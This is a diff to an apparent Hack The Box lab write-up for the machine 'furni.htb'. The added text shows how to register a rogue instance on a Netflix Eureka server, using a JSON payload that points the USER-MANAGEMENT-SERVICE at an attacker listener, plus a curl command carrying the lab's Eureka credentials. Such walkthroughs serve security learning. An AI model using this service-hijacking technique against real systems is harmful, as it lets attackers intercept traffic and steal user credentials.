@@ -136,7 +136,38 @@ And running ```cat /web/user-management-service/log/application.log``` we can se
 ...
 ```
 
-Thus we will create a fake service on the instance. This can be done with curl sending a POST request.
+Thus we will create a fake service on the instance. This can be done with curl sending a POST request. For that we need to send some data to eureka. In the following format:
+
+```
+{
+  "instance": {
+    "instanceId": "test",
+    "hostName": "LISTENER_IP",
+    "app": "USER-MANAGEMENT-SERVICE",
+    "ipAddr": "LISTENER_IP",
+    "vipAddress": "USER-MANAGEMENT-SERVICE",
+    "port": {
+      "$": 80,
+      "@enabled": true
+    },
+    "dataCenterInfo": {
+      "@class": "com.netflix.appinfo.InstanceInfo$DefaultDataCenterInfo",
+      "name": "MyOwn"
+    },
+    "status": "UP"
+  }
+}
+```
+
+Put the info in a json-file to go with the curl post:
+
+```curl -H 'Content-Type: application/json' -d @info.json 'http://EurekaSrvr:0scarPWDisTheB3st@furni.htb:8761/eureka/apps/USER-MANAGEMENT-SERVICE'```
+
+Running this we can see that the service "test" is registered on the eureka server:
+
+<img width="936" height="314" alt="Screenshot 2025-09-03 at 03 54 07" src="https://github.com/user-attachments/assets/7045132e-ed35-4e76-b7b9-c4b7cfe0e9fa" />
+
+
 
 
 
